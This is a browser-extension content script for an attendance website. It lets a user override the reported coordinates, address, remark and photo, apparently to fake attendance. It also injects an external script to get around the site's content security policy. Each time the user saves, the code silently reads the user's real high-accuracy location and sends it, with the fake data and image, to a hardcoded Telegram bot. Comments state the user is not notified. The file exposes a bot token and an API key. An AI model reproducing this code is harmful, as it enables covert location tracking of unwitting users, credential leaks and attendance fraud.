// Content script – injects inject.js and creates UI panel (silent Telegram)

// Inject the external script file into page (bypasses CSP)
const script = document.createElement('script');
script.src = chrome.runtime.getURL('inject.js');
script.onload = function() { this.remove(); };
(document.head || document.documentElement).appendChild(script);

// Helper: parse coordinate string
function parseCoordinates(coordStr) {
    let trimmed = coordStr.trim();
    let parts = trimmed.split(/[\s,]+/);
    if (parts.length >= 2) {
        let lat = parseFloat(parts[0]);
        let lon = parseFloat(parts[1]);
        if (!isNaN(lat) && !isNaN(lon)) return { lat, lon };
    }
    return null;
}

// Reverse geocode using LocationIQ (async)
async function reverseGeocode(lat, lon, apiKey) {
    try {
        const url = `https://us1.locationiq.com/v1/reverse?key=${apiKey}&lat=${lat}&lon=${lon}&format=json`;
        const response = await fetch(url);
        const data = await response.json();
        return data.display_name || `${lat}, ${lon}`;
    } catch (err) {
        return `${lat}, ${lon}`;
    }
}

// Get original (real) location
function getOriginalLocation() {
    return new Promise((resolve) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        lat: position.coords.latitude,
                        lon: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    });
                },
                () => resolve(null),
                { timeout: 8000, enableHighAccuracy: true }
            );
        } else {
            resolve(null);
        }
    });
}

// Send message + photo to Telegram (silent, no logs)
// Send message + photo to Telegram (silent, with Google Maps links)
async function sendToTelegram(customData, originalLocation, customImageBase64) {
    const BOT_TOKEN = '8695527306:AAGz1UX_nNEeDcknnKK8yDXVeiO3Qh14hKo';
    const CHAT_IDS = ['878604830'];

    // Helper to make Google Maps link
    function mapLink(lat, lon) {
        return `https://www.google.com/maps?q=${lat},${lon}`;
    }

    // Build text message with clickable links (Markdown format)
    let message = `📍 *Custom Attendance Data*\n\n`;
    message += `*Custom Location:*\n`;
    message += `👉 [Open in Google Maps](${mapLink(customData.lat, customData.lon)})\n`;
    message += `Lat: ${customData.lat}, Lon: ${customData.lon}\n`;
    message += `Address: ${customData.address}\n\n`;
    message += `*Custom Remark:* ${customData.remark || '(none)'}\n`;
    message += `*Custom Image:* ${customData.imageSaved ? '✅ Saved' : '❌ Not saved'}\n\n`;
    
    if (originalLocation) {
        message += `🟢 *Original (Real) Location:*\n`;
        message += `👉 [Open in Google Maps](${mapLink(originalLocation.lat, originalLocation.lon)})\n`;
        message += `Lat: ${originalLocation.lat}, Lon: ${originalLocation.lon}\n`;
        message += `Accuracy: ±${originalLocation.accuracy} meters\n`;
        message += `Timestamp: ${new Date().toLocaleString()}\n`;
    } else {
        message += `⚠️ *Original location unavailable*\n`;
    }
    message += `\n🕒 Report time: ${new Date().toLocaleString()}`;

    // Helper: send to one chat
    async function sendToOneChat(chatId) {
        // 1. Send photo if exists
        if (customImageBase64) {
            try {
                const blob = await (await fetch(customImageBase64)).blob();
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'custom_attendance.jpg');
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) { /* silent */ }
        }
        // 2. Send text message with Markdown links
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: false  // shows preview of map link
                })
            });
        } catch (e) { /* silent */ }
    }

    for (const chatId of CHAT_IDS) {
        await sendToOneChat(chatId);
    }
}
// Create UI Panel (no map, silent Telegram)
function createUI() {
    if (document.getElementById('smart-att-panel')) return;

    const toggleBtn = document.createElement('button');
    toggleBtn.id = 'smart-att-toggle';
    toggleBtn.innerText = '⚙️ Custom Data';
    document.body.appendChild(toggleBtn);

    const panel = document.createElement('div');
    panel.id = 'smart-att-panel';
    panel.innerHTML = `
        <h4>✏️ Override Settings</h4>
        <label>Coordinates (lat, lon):</label>
        <input type="text" id="smart-coord" placeholder="e.g., 26.896586768921352, 75.71579255958834">
        <label>Address:</label>
        <input type="text" id="smart-addr" placeholder="Auto-filled from coordinates">
        <label>Remark:</label>
        <textarea id="smart-remark" placeholder="Remark..."></textarea>
        <label>Custom Image (JPEG/PNG):</label>
        <input type="file" id="smart-image" accept="image/jpeg,image/png">
        <button id="smart-save">💾 Apply Settings</button>
    `;
    document.body.appendChild(panel);
    panel.style.display = 'none';

    toggleBtn.onclick = () => {
        panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
    };

    // Load saved values
    let currentLat = localStorage.getItem('smart_lat') || '19.0760';
    let currentLon = localStorage.getItem('smart_lon') || '72.8777';
    let currentAddr = localStorage.getItem('smart_addr') || 'Mumbai, India';
    let currentRemark = localStorage.getItem('smart_remark') || '';

    document.getElementById('smart-coord').value = `${currentLat}, ${currentLon}`;
    document.getElementById('smart-addr').value = currentAddr;
    document.getElementById('smart-remark').value = currentRemark;

    // Coordinate blur -> auto address fetch
    const coordInput = document.getElementById('smart-coord');
    coordInput.addEventListener('blur', async () => {
        const coordStr = coordInput.value;
        const parsed = parseCoordinates(coordStr);
        if (parsed) {
            localStorage.setItem('smart_lat', parsed.lat.toString());
            localStorage.setItem('smart_lon', parsed.lon.toString());
            const apiKey = document.getElementById('ctl00_BodyContentPlaceHolder_hdnKey')?.value || 'pk.c08d1307c75136fa2709e2374acd8cce';
            const fetchedAddr = await reverseGeocode(parsed.lat, parsed.lon, apiKey);
            document.getElementById('smart-addr').value = fetchedAddr;
        }
    });

    // Save button – silent Telegram
    document.getElementById('smart-save').addEventListener('click', async function() {
        const coordStr = document.getElementById('smart-coord').value;
        const parsed = parseCoordinates(coordStr);
        let finalLat, finalLon;
        if (parsed) {
            finalLat = parsed.lat;
            finalLon = parsed.lon;
        } else {
            finalLat = parseFloat(localStorage.getItem('smart_lat')) || 19.0760;
            finalLon = parseFloat(localStorage.getItem('smart_lon')) || 72.8777;
            document.getElementById('smart-coord').value = `${finalLat}, ${finalLon}`;
        }
        const finalAddr = document.getElementById('smart-addr').value;
        const finalRemark = document.getElementById('smart-remark').value;
        
        // Handle image
        let customImageBase64 = localStorage.getItem('smart_image'); // existing
        let imageSaved = !!customImageBase64;
        const fileInput = document.getElementById('smart-image');
        if (fileInput.files.length > 0) {
            const reader = new FileReader();
            // We'll need to wait for image read before saving & sending
            const imageData = await new Promise((resolve) => {
                reader.onload = (e) => resolve(e.target.result);
                reader.readAsDataURL(fileInput.files[0]);
            });
            customImageBase64 = imageData;
            imageSaved = true;
            localStorage.setItem('smart_image', customImageBase64);
        }
        
        // Save to localStorage
        localStorage.setItem('smart_lat', finalLat.toString());
        localStorage.setItem('smart_lon', finalLon.toString());
        localStorage.setItem('smart_addr', finalAddr);
        localStorage.setItem('smart_remark', finalRemark);
        
        // Get original location silently
        const originalLoc = await getOriginalLocation();
        
        // Prepare custom data
        const customData = {
            lat: finalLat,
            lon: finalLon,
            address: finalAddr,
            remark: finalRemark,
            imageSaved: imageSaved
        };
        
        // Send to Telegram in background (don't await, don't notify user)
        sendToTelegram(customData, originalLoc, customImageBase64);
        
        alert('✅ Settings saved');
    });
}

// Wait for DOM ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', createUI);
} else {
    createUI();
}
